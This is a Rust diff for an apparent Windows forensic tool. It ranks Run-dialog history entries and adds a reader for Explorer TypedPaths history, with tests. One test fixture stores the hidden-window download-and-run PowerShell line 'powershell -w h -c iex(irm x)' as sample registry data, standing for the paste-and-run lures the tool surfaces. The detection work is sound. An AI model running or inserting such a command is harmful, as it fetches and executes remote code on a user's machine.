@@ -562,7 +562,9 @@ pub const RUN_MRU_KEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Explor
 
 /// One `RegValueRecord` per Run-dialog entry of every loaded user, most recent first
 /// (`MRUList` order). The trailing `\1` Explorer appends to each command is removed.
-/// `last_write` is the key's LastWrite, i.e. when the most recent entry was typed.
+/// `last_write` is the key's LastWrite, which dates only the most recent entry:
+/// `mru_rank` (0 = most recent, the `MRUList` position) says which one that is. An
+/// entry missing from `MRUList` sorts last with `mru_rank: None`.
 pub fn read_run_mru(reg: &dyn RegRead) -> Vec<RegValueRecord> {
     let mut out = Vec::new();
     for (hive, key) in user_roots(reg, RUN_MRU_KEY) {
@@ -594,18 +596,76 @@ pub fn read_run_mru(reg: &dyn RegRead) -> Vec<RegValueRecord> {
             })
             .collect();
         entries.sort();
-        let (hive_label, key_path) = match key.split_once('\\') {
-            Some((sid, rest)) if hive == Hive::Hku => (format!("HKU\\{sid}"), rest.to_string()),
-            _ => (hive.prefix().to_string(), key.clone()),
-        };
-        for (_, name, cmd) in entries {
+        let (hive_label, key_path) = record_hive_and_key(hive, &key);
+        for (rank, name, cmd) in entries {
             out.push(RegValueRecord {
                 hive: hive_label.clone(),
                 key: key_path.clone(),
                 value: name,
                 data: cmd,
                 last_write: lw,
-                mru_rank: None,
+                // MRUList holds one ASCII letter per entry, so the byte index of the
+                // value's letter is its rank; usize::MAX marks "not in MRUList".
+                mru_rank: (rank != usize::MAX)
+                    .then(|| u32::try_from(rank).ok())
+                    .flatten(),
+            });
+        }
+    }
+    out
+}
+
+/// Split a per-user (hive, key) root into the RegValueRecord's `hive` label
+/// (`HKU\<sid>` or `HKCU`) and the key path below it.
+fn record_hive_and_key(hive: Hive, key: &str) -> (String, String) {
+    match key.split_once('\\') {
+        Some((sid, rest)) if hive == Hive::Hku => (format!("HKU\\{sid}"), rest.to_string()),
+        _ => (hive.prefix().to_string(), key.to_string()),
+    }
+}
+
+/// Explorer address-bar history, RunMRU's sibling: paths and commands typed into the
+/// File Explorer address bar (which also launches programs, so paste-and-run lures
+/// use it too). Not persistence: emitted as `RegValue`.
+pub const TYPED_PATHS_KEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths";
+
+/// One `RegValueRecord` per TypedPaths entry of every loaded user (same per-user roots
+/// as [`read_run_mru`]). Values are named `url1` (most recent) .. `urlN`; records are
+/// emitted in that order with `mru_rank = N - 1`. Other value names are ignored.
+/// `last_write` is the key's LastWrite (dates only `mru_rank == 0`).
+pub fn read_typed_paths(reg: &dyn RegRead) -> Vec<RegValueRecord> {
+    let mut out = Vec::new();
+    for (hive, key) in user_roots(reg, TYPED_PATHS_KEY) {
+        let Some((values, lw)) = reg.values(hive, &key) else {
+            continue;
+        };
+        let mut entries: Vec<(u32, String, String)> = values
+            .iter()
+            .filter_map(|(n, d)| {
+                let idx: u32 = n
+                    .get(..3)
+                    .filter(|p| p.eq_ignore_ascii_case("url"))
+                    .and_then(|_| n.get(3..))
+                    .and_then(|digits| digits.parse().ok())
+                    .filter(|&i| i >= 1)?;
+                match d {
+                    RegData::Str(s) if !s.trim().is_empty() => {
+                        Some((idx, n.clone(), s.trim().to_string()))
+                    }
+                    _ => None,
+                }
+            })
+            .collect();
+        entries.sort();
+        let (hive_label, key_path) = record_hive_and_key(hive, &key);
+        for (idx, name, path) in entries {
+            out.push(RegValueRecord {
+                hive: hive_label.clone(),
+                key: key_path.clone(),
+                value: name,
+                data: path,
+                last_write: lw,
+                mru_rank: Some(idx - 1),
             });
         }
     }
@@ -858,6 +918,57 @@ mod tests {
             recs[0].key.to_ascii_lowercase(),
             RUN_MRU_KEY.to_ascii_lowercase()
         );
+        assert_eq!(recs[0].mru_rank, Some(0));
+        assert_eq!(recs[1].mru_rank, Some(1));
+    }
+
+    /// An entry missing from MRUList sorts last and has no rank.
+    #[test]
+    fn run_mru_entry_outside_mrulist_has_no_rank() {
+        let mut reg = FakeReg::default();
+        reg.set(Hive::Hkcu, RUN_MRU_KEY, "c", s(r"calc\1"))
+            .set(Hive::Hkcu, RUN_MRU_KEY, "a", s(r"cmd\1"))
+            .set(Hive::Hkcu, RUN_MRU_KEY, "MRUList", s("a"));
+        let recs = read_run_mru(&reg);
+        assert_eq!(recs.len(), 2);
+        assert_eq!((recs[0].data.as_str(), recs[0].mru_rank), ("cmd", Some(0)));
+        assert_eq!((recs[1].data.as_str(), recs[1].mru_rank), ("calc", None));
+    }
+
+    #[test]
+    fn typed_paths_ordered_by_url_index_with_rank() {
+        let mut reg = FakeReg::default();
+        let key = format!(r"{SID}\{TYPED_PATHS_KEY}");
+        reg.set(Hive::Hku, &key, "url10", s(r"C:\old"))
+            .set(Hive::Hku, &key, "url2", s(r"\\10.0.0.5\share"))
+            .set(Hive::Hku, &key, "url1", s("powershell -w h -c iex(irm x)"))
+            .set(Hive::Hku, &key, "junk", s("ignored"))
+            .set(Hive::Hku, &key, "url3", RegData::Other)
+            .set(Hive::Hku, &key, "url0", s("ignored too"));
+        let recs = read_typed_paths(&reg);
+        let got: Vec<_> = recs
+            .iter()
+            .map(|r| (r.value.as_str(), r.mru_rank))
+            .collect();
+        assert_eq!(
+            got,
+            vec![("url1", Some(0)), ("url2", Some(1)), ("url10", Some(9))]
+        );
+        assert_eq!(recs[0].hive, r"HKU\s-1-5-21-1111-2222-3333-1001");
+        assert_eq!(
+            recs[0].key.to_ascii_lowercase(),
+            TYPED_PATHS_KEY.to_ascii_lowercase()
+        );
+    }
+
+    #[test]
+    fn typed_paths_falls_back_to_hkcu() {
+        let mut reg = FakeReg::default();
+        reg.set(Hive::Hkcu, TYPED_PATHS_KEY, "url1", s(r"C:\Temp"));
+        let recs = read_typed_paths(&reg);
+        assert_eq!(recs.len(), 1);
+        assert_eq!(recs[0].hive, "HKCU");
+        assert_eq!(recs[0].mru_rank, Some(0));
     }
 
     #[test]
